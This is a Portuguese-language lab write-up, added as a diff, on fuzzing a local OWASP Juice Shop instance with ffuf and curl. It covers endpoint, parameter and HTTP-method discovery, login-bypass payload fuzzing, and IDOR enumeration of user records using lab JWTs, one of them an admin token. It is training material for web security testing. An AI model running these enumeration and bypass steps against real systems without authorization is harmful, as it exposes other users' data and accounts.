@@ -1,0 +1,230 @@
+1- Descoberta De Endpoints
+ffuf -u http://juice:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,401,403 -fs 75002 -t 40 -c
+
+2 - ENumeracao de parametros
+ffuf -u "http://juice:3000/rest/products/search?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 13644 -c
+
+3- FUzzing de Metodos HTTP
+ffuf -u http://juice:3000/rest/products/search?q=test -X FUZZ -w /usr/share/seclists/Fuzzing/http-request-methods.txt -mc 200,204,301,302,400,401,403,405,500 -ccurl -s -X POST http://juice:3000/rest/user/login -H "Content-Type: application/json" -d '{"email":"teste@teste.com","password":"teste"}' | wc -c
+
+ffuf -u http://juice:3000/rest/basket/1 -X FUZZ -w /usr/share/seclists/Fuzzing/http-request-methods.txt -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDItMjYgMTg6MzE6MzMuMDg2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDItMjYgMTg6MzE6MzMuMDg2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MjEzMzU5NX0.ZJb2mo_lwSxgIvA7UDPXSftUyrhI6-wqUvolAP1DWCcVgpMjy1Y_EjsLsvwdWSaZIo6jWvlganrtLhoFK2bAZEA88o1LZV3IVFjgs6l8HxFGyF71n3oOPNr0G5AC8jK1TLvQ6HwP6MrceTOmfM1VLvbfFcjeGQ65W1XUHBvEKKs" -mc all -c
+
+
+
+
+
+
+curl -s -i -X POST http://juice:3000/api/Users -H "Content-Type: application/json" -d '{"email":"poc_method_fuzz_1@lab.local","password":"Teste@12345","passwordRepeat":"Teste@12345","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2020-01-01","updatedAt":"2020-01-01"},"securityAnswer":"a"}'
+
+ffuf -u http://juice:3000/api/Users -X FUZZ -w /usr/share/seclists/Fuzzing/http-request-methods.txt -mc 201,401,204,500 -c
+
+
+curl -i http://juice:3000/api/Users/24 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDItMjYgMTg6MzE6MzMuMDg2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDItMjYgMTg6MzE6MzMuMDg2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3MjEzMzU5NX0.ZJb2mo_lwSxgIvA7UDPXSftUyrhI6-wqUvolAP1DWCcVgpMjy1Y_EjsLsvwdWSaZIo6jWvlganrtLhoFK2bAZEA88o1LZV3IVFjgs6l8HxFGyF71n3oOPNr0G5AC8jK1TLvQ6HwP6MrceTOmfM1VLvbfFcjeGQ65W1XUHBvEKKs" -H "Accept: application/json"
+
+curl -i http://juice:3000/api/Users/21 -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJwb2NfbWV0aG9kX2Z1enpfMUBsYWIubG9jYWwiLCJwYXNzd29yZCI6IjJmY2Q5ZjljZWNiODEzMGNjMGY4NDc0MDIwM2U2ZjIyIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wMi0yNiAxOTo0NToxMC4xODkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wMi0yNiAxOTo0NToxMC4xODkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzcyMTM1ODAxfQ.DP5fREV3giBzWTN0PwaXmBQKHQ1qCKjGaK6qbOvQ8q9ZEKLaAX7EiZZGYdTJOg8GnfuNQv-tqezH_HhwlbbZvsrcBqKMtmBOaGXtj35X0taatNEYWBa6fnRtPJiddoAyJkqFA2A-5EONL_b_Fc8w4zf4M-jG4_K2tOqhDvazW8Q" -H "Accept: application/json"
+
+4- Fuzzing de Payloads 
+curl -s -X POST http://juice:3000/rest/user/login -H "Content-Type: application/json" -d '{"email":"teste@teste.com","password":"teste"}' | wc -c
+
+ffuf -u http://juice:3000/rest/user/login -X POST -H "Content-Type: application/json" -d '{"email":"FUZZ","password":"teste"}' -w /usr/share/seclists/Fuzzing/login_bypass.txt -mc 200 -fs 26 -c
+
+5- fuzzing para enumeracao de users 
+ffuf -u http://juice:3000/api/Users/FUZZ -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJwb2NfbWV0aG9kX2Z1enpfMUBsYWIubG9jYWwiLCJwYXNzd29yZCI6IjJmY2Q5ZjljZWNiODEzMGNjMGY4NDc0MDIwM2U2ZjIyIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wMi0yNiAxOTo0NToxMC4xODkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wMi0yNiAxOTo0NToxMC4xODkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzcyMTM1ODAxfQ.DP5fREV3giBzWTN0PwaXmBQKHQ1qCKjGaK6qbOvQ8q9ZEKLaAX7EiZZGYdTJOg8GnfuNQv-tqezH_HhwlbbZvsrcBqKMtmBOaGXtj35X0taatNEYWBa6fnRtPJiddoAyJkqFA2A-5EONL_b_Fc8w4zf4M-jG4_K2tOqhDvazW8Q" -w /usr/share/seclists/Fuzzing/3-digits-000-999.txt -mc 200 -c
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+1️⃣ Descoberta de Endpoints
+Objetivo
+
+Identificar diretórios e endpoints expostos na aplicação.
+
+Comando Utilizado
+ffuf -u http://juice:3000/FUZZ \
+-w /usr/share/seclists/Discovery/Web-Content/common.txt \
+-mc 200,204,301,302,401,403 \
+-fs 75002 \
+-t 40 \
+-c
+Técnica Aplicada
+
+Directory brute force
+
+Filtragem por tamanho de resposta padrão (-fs 75002) para evitar falsos positivos
+
+Enumeração de rotas acessíveis
+
+Resultado
+
+Foram identificados múltiplos endpoints válidos retornando códigos HTTP relevantes (200, 401, 403), indicando superfícies adicionais de ataque.
+
+2️⃣ Enumeração de Parâmetros
+Objetivo
+
+Descobrir parâmetros ocultos no endpoint de busca de produtos.
+
+Comando Utilizado
+ffuf -u "http://juice:3000/rest/products/search?FUZZ=test" \
+-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+-mc 200 \
+-fs 13644 \
+-c
+Técnica Aplicada
+
+Parameter fuzzing
+
+Identificação de variações no tamanho da resposta
+
+Detecção de parâmetros válidos
+
+Resultado
+
+Foi identificado o parâmetro válido q, que altera significativamente o tamanho da resposta, confirmando que o endpoint possui parâmetros processados pelo backend.
+
+3️⃣ Fuzzing de Métodos HTTP
+Objetivo
+
+Identificar métodos HTTP indevidamente habilitados.
+
+Teste em endpoint de busca
+ffuf -u http://juice:3000/rest/products/search?q=test \
+-X FUZZ \
+-w /usr/share/seclists/Fuzzing/http-request-methods.txt \
+-mc 200,204,301,302,400,401,403,405,500 \
+-c
+Teste em endpoint autenticado (basket)
+ffuf -u http://juice:3000/rest/basket/1 \
+-X FUZZ \
+-w /usr/share/seclists/Fuzzing/http-request-methods.txt \
+-H "Authorization: Bearer <TOKEN>" \
+-mc all \
+-c
+Teste em endpoint de criação de usuário
+curl -s -i -X POST http://juice:3000/api/Users \
+-H "Content-Type: application/json" \
+-d '{"email":"poc_method_fuzz_1@lab.local","password":"Teste@12345","passwordRepeat":"Teste@12345","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2020-01-01","updatedAt":"2020-01-01"},"securityAnswer":"a"}'
+Resposta
+HTTP/1.1 201 Created
+Fuzzing de métodos no endpoint /api/Users
+ffuf -u http://juice:3000/api/Users \
+-X FUZZ \
+-w /usr/share/seclists/Fuzzing/http-request-methods.txt \
+-mc 201,401,204,500 \
+-c
+Resultado
+
+Foi identificado que o método POST permite criação de usuários (201 Created).
+Outros métodos retornaram respostas distintas, confirmando comportamento diferenciado por método HTTP.
+
+4️⃣ Fuzzing de Payloads (Login Bypass)
+Objetivo
+
+Testar possíveis bypass de autenticação via manipulação de payload.
+
+Baseline (tamanho da resposta inválida)
+curl -s -X POST http://juice:3000/rest/user/login \
+-H "Content-Type: application/json" \
+-d '{"email":"teste@teste.com","password":"teste"}' | wc -c
+
+Tamanho da resposta inválida: 26 bytes
+
+Fuzzing utilizando wordlist de bypass
+ffuf -u http://juice:3000/rest/user/login \
+-X POST \
+-H "Content-Type: application/json" \
+-d '{"email":"FUZZ","password":"teste"}' \
+-w /usr/share/seclists/Fuzzing/login_bypass.txt \
+-mc 200 \
+-fs 26 \
+-c
+Técnica Aplicada
+
+Filtro por tamanho padrão de erro
+
+Busca por variações que retornem 200 OK
+
+5️⃣ Fuzzing para Enumeração de Usuários (IDOR)
+Objetivo
+
+Verificar se usuários podem ser enumerados por ID.
+
+Teste Manual
+curl -i http://juice:3000/api/Users/21 \
+-H "Authorization: Bearer <TOKEN>" \
+-H "Accept: application/json"
+
+Resposta: 200 OK
+Retornou dados de outro usuário autenticado.
+
+Fuzzing Automatizado
+ffuf -u http://juice:3000/api/Users/FUZZ \
+-H "Authorization: Bearer <TOKEN>" \
+-w /usr/share/seclists/Fuzzing/3-digits-000-999.txt \
+-mc 200 \
+-c
+Resultado
+
+Foi possível enumerar múltiplos usuários válidos via ID sequencial.
+
+Vulnerabilidade Identificada
+
+IDOR (Insecure Direct Object Reference)
+
+O endpoint permite acesso a registros de usuários diferentes do autenticado, caracterizando falha de controle de acesso.
+
+📌 Conclusão Geral
+
+Os testes de fuzzing permitiram identificar:
+
+Superfície ampliada de endpoints expostos
+
+Parâmetros ocultos
+
+Métodos HTTP ativos
+
+Enumeração de usuários via IDOR
+
+Potenciais vetores de autenticação fraca
+
+O uso de filtragem por tamanho de resposta (-fs) e análise diferencial foi essencial para reduzir falsos positivos e identificar respostas relevantes.
